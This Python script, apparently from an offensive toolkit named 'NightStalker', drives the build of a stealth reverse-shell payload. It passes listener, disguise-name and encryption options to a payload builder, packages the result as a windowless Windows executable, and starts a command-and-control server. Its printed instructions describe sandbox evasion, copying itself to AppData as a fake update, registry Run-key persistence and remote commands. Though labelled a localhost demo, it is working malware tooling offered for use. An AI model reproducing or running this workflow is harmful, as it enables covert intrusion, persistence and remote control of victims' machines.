#!/usr/bin/env python3
"""
NightStalker - Stealth Payload Demo
Demonstrates the capabilities of the stealth reverse shell payload
"""

import os
import sys
import subprocess
import time
import threading
import socket

def print_banner():
    """Print demo banner"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                    NightStalker Stealth Payload Demo         ║
║                    Advanced Reverse Shell Demonstration       ║
╚══════════════════════════════════════════════════════════════╝
""")

def check_dependencies():
    """Check if required dependencies are available"""
    print("[*] Checking dependencies...")
    
    dependencies = {
        'pyinstaller': 'pip install pyinstaller',
        'python': 'Python 3.6+ required'
    }
    
    missing = []
    for dep, install_cmd in dependencies.items():
        try:
            if dep == 'python':
                version = sys.version_info
                if version.major >= 3 and version.minor >= 6:
                    print(f"[+] Python {version.major}.{version.minor} ✓")
                else:
                    missing.append(f"Python 3.6+ (current: {version.major}.{version.minor})")
            else:
                subprocess.run([dep, '--version'], capture_output=True, check=True)
                print(f"[+] {dep} ✓")
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing.append(f"{dep} ({install_cmd})")
    
    if missing:
        print("\n[!] Missing dependencies:")
        for dep in missing:
            print(f"    - {dep}")
        return False
    
    print("[+] All dependencies available ✓\n")
    return True

def generate_payload():
    """Generate a demo payload"""
    print("[*] Generating demo payload...")
    
    try:
        # Use localhost for demo
        cmd = [
            sys.executable, 'payload_builder.py',
            '--lhost', '127.0.0.1',
            '--lport', '4444',
            '--name', 'demo_update.exe',
            '--reg-key', 'DemoSecurity',
            '--encryption-key', 'DemoKey2024!',
            '--output', 'demo_payload.py'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Demo payload generated successfully")
            print(result.stdout)
            return True
        else:
            print(f"[!] Error generating payload: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def build_executable():
    """Build the payload into an executable"""
    print("[*] Building executable...")
    
    try:
        cmd = [
            'pyinstaller',
            '--noconsole',
            '--onefile',
            '--name', 'demo_payload',
            'demo_payload.py'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Executable built successfully")
            print("[+] Location: dist/demo_payload.exe")
            return True
        else:
            print(f"[!] Error building executable: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def start_c2_server():
    """Start the C2 server in background"""
    print("[*] Starting C2 server...")
    
    try:
        cmd = [
            sys.executable, 'c2_server.py',
            '--host', '127.0.0.1',
            '--port', '4444',
            '--key', 'DemoKey2024!'
        ]
        
        # Start server in background
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait a moment for server to start
        time.sleep(2)
        
        # Check if server is running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', 4444))
            sock.close()
            
            if result == 0:
                print("[+] C2 server started successfully")
                return process
            else:
                print("[!] C2 server failed to start")
                process.terminate()
                return None
                
        except Exception as e:
            print(f"[!] Error checking server: {e}")
            process.terminate()
            return None
            
    except Exception as e:
        print(f"[!] Error starting server: {e}")
        return None

def validate_payload():
    """Validate the payload functionality"""
    print("[*] Validating payload functionality...")
    
    try:
        # Check if executable exists
        exe_path = "dist/demo_payload.exe"
        if not os.path.exists(exe_path):
            print(f"[!] Executable not found: {exe_path}")
            return False
        
        print(f"[+] Found executable: {exe_path}")
        print("[+] Payload features to validate:")
        print("    - Anti-detection (VM/sandbox detection)")
        print("    - Persistence (registry and file copy)")
        print("    - Encrypted communication")
        print("    - Stealth execution")
        
        return True
        
    except Exception as e:
        print(f"[!] Error validating payload: {e}")
        return False

def show_usage_instructions():
    """Show usage instructions"""
    print("\n" + "="*60)
    print("DEMO USAGE INSTRUCTIONS")
    print("="*60)
    
    print("""
1. C2 SERVER IS RUNNING:
   - The C2 server is now listening on 127.0.0.1:4444
   - You can connect to it manually or run the payload

2. TO TEST THE PAYLOAD:
   - Run: dist/demo_payload.exe
   - The payload will:
     * Check for VM/sandbox environment
     * Copy itself to AppData as 'demo_update.exe'
     * Set up registry persistence
     * Connect to C2 server with encrypted communication

3. C2 SERVER COMMANDS:
   - help: Show available commands
   - list: List connected clients
   - whoami: Get current user
   - ipconfig: Network configuration
   - systeminfo: System information
   - exit/quit: Exit server

4. PERSISTENCE TEST:
   - Restart the target system
   - Check if payload auto-starts
   - Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DemoSecurity

5. CLEANUP:
   - Stop C2 server (Ctrl+C)
   - Remove registry key
   - Delete payload files from AppData
""")

def cleanup():
    """Clean up demo files"""
    print("\n[*] Cleaning up demo files...")
    
    files_to_remove = [
        'demo_payload.py',
        'demo_payload.spec',
        'build/',
        'dist/',
        '__pycache__/'
    ]
    
    for file_path in files_to_remove:
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f"[+] Removed: {file_path}")
            elif os.path.isdir(file_path):
                import shutil
                shutil.rmtree(file_path)
                print(f"[+] Removed: {file_path}")
        except Exception as e:
            print(f"[!] Could not remove {file_path}: {e}")

def main():
    """Main demo function"""
    print_banner()
    
    # Check dependencies
    if not check_dependencies():
        print("[!] Please install missing dependencies and try again")
        return
    
    # Generate payload
    if not generate_payload():
        print("[!] Failed to generate payload")
        return
    
    # Build executable
    if not build_executable():
        print("[!] Failed to build executable")
        return
    
    # Validate payload
    if not validate_payload():
        print("[!] Payload validation failed")
        return
    
    # Start C2 server
    server_process = start_c2_server()
    if not server_process:
        print("[!] Failed to start C2 server")
        return
    
    # Show usage instructions
    show_usage_instructions()
    
    try:
        # Keep server running
        print("\n[+] Demo setup complete! C2 server is running...")
        print("[+] Press Ctrl+C to stop the demo")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Stopping demo...")
        
        # Stop server
        if server_process:
            server_process.terminate()
            print("[+] C2 server stopped")
        
        # Cleanup
        cleanup_choice = input("\nClean up demo files? (y/n): ").strip().lower()
        if cleanup_choice == 'y':
            cleanup()
        
        print("[+] Demo completed")

if __name__ == "__main__":
    main() 